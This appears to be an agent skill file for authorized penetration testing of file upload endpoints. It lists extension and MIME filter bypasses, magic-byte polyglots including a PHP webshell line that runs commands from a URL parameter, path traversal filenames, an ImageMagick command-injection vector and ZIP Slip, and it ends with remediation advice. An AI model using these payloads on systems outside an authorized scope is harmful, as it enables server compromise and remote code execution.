---
name: web-file-upload-webshell
description: Unrestricted file upload assessment, MIME-type and extension filter bypasses, double extensions, magic byte spoofing, path traversal in filenames, and polyglot execution sinks.
---

# File Upload Security Assessment & Extension Filter Bypasses

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified file upload forms, avatar uploaders, document attachments, and media endpoints in `.hacker-harness/scope.yaml`.
- **Target Parameters:** Multi-part form-data inputs (`filename`, `Content-Type`), base64 upload APIs, file import URLs.
- **Traffic Routing:** Route upload requests through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: MIME-Type & Extension Matrix Testing
Test upload boundaries with benign probe scripts:
```http
POST /api/v1/upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg

<?php echo "TEST_UPLOAD_SUCCESS"; ?>
------WebKitFormBoundaryX--
```

### Step 2: Extension Filter Bypasses & Normalization Tricks
1. **Case Sensitivity:** `test.pHp`, `test.PhP5`, `test.pHTML`
2. **Double Extensions & Trailing Characters:**
   - `test.php.jpg` or `test.jpg.php`
   - `test.php.` or `test.php%20`
   - `test.php::$DATA` (Windows NTFS alternate data stream)
   - `test.php%00.jpg` (Null-byte truncation in legacy runtimes)
3. **Alternative Executable Extensions:**
   - PHP: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phar`, `.inc`
   - ASP/ASPX: `.aspx`, `.ashx`, `.asmx`, `.asax`, `.config`
   - JSP: `.jsp`, `.jspx`, `.jsw`, `.jsf`, `.jspf`
   - Server Config: `.htaccess`, `.user.ini`, `web.config`

### Step 3: Magic Byte Spoofing & Polyglot Payloads
When the server validates file headers:
```text
# GIF89a Header Spoofing:
GIF89a;
<?php phpinfo(); ?>

# PNG Header Spoofing:
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR... <?php system($_GET['cmd']); ?>
```

### Step 4: Filename Path Traversal
Attempt to write outside the upload sandbox into accessible web roots or system paths:
```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Disposition: form-data; name="file"; filename="..%2f..%2fpublic%2fexploit.jsp"
```

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Upload Vector | Bypass Technique | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Avatar Crop / ImageMagick** | Embedded MSL / MVG commands | `.mvg` image file containing `push graphic-context... viewbox 0 0 640 480 image over 0,0 0,0 'https://127.0.0.1/x\|id'` | Command execution via image processing library |
| **Apache `.htaccess` Upload** | Override MIME type for `.jpg` | Upload `.htaccess` with `AddType application/x-httpd-php .jpg` $\rightarrow$ upload `shell.jpg` | PHP code executed when browsing `shell.jpg` |
| **ZIP Slip in Document Importer** | Archive extraction with directory traversal | Upload ZIP containing `../../../../var/www/static/poc.html` | Arbitrary file overwrite on filesystem |
| **Client-Side JS Validation Only** | Frontend checks extension with regex | Intercept in Caido and change extension from `.png` to `.php` | Server stores and executes `.php` file directly |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture HTTP upload request, server response returning file URL/path, and subsequent GET request executing or rendering the file content.
2. **Impact Proof:** Execute benign markers (e.g. `phpinfo()`, mathematical calculation, or `echo "POC"`) without deploying destructive backdoors.
3. **Remediation:** Store uploaded files outside the public web root, generate random alphanumeric filenames on the server side, validate extensions against a strict allowlist, and serve uploaded content with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
